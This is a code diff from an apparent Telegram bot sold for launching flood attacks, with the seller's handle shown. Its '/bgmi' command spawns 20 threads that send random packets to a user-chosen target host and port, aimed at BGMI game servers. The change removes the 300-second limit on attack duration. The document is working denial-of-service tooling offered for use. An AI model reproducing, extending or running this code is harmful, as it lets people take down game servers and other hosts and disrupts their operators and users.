@@ -219,16 +219,13 @@ Buy From :- @ReporterAlpha'''
             target = args[1]
             port = int(args[2])
             time = int(args[3])
-            if time > 300:
-                bot.reply_to(message, "Error: Time interval must be less than 300.")
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                bot.reply_to(message, f"{message.from_user.username or message.from_user.first_name}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI")
-                data = os.urandom(600)
-                for _ in range(20):  # 20 threads
-                    threading.Thread(target=send_packets_direct, args=(target, port, data, 0.1, time)).start()
-                bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
+            record_command_logs(user_id, '/bgmi', target, port, time)
+            log_command(user_id, target, port, time)
+            bot.reply_to(message, f"{message.from_user.username or message.from_user.first_name}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI")
+            data = os.urandom(600)
+            for _ in range(20):  # 20 threads
+                threading.Thread(target=send_packets_direct, args=(target, port, data, 0.1, time)).start()
+            bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
         else:
             bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>")
 
